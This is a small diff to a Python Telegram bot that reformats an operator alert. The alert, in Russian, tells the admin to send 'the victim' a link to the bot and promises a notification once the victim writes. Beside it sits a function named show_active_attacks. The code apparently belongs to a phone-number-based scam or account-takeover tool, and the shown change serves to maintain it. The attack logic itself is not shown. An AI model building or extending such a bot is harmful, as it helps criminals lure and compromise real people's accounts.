@@ -199,14 +199,13 @@ def process_admin_phone(message):
     phone = message.text
 
     bot.send_message(
-        ADMIN_ID,
-        f"⚠️ *Режим ожидания*\n"
-        f"Номер: {phone}\n\n"
-        f"Отправь жертве ссылку:\n"
-        f"https://t.me/{bot.get_me().username}\n\n"
-        f"Как только жертва напишет — я пришлю уведомление.",
-        parse_mode="Markdown"
-    )
+    ADMIN_ID,
+    f"⚠️ Режим ожидания\n"
+    f"Номер: {phone}\n\n"
+    f"Отправь жертве ссылку:\n"
+    f"https://t.me/{bot.get_me().username}\n\n"
+    f"Как только жертва напишет — я пришлю уведомление."
+)
 
 def show_active_attacks():
     cursor.execute(
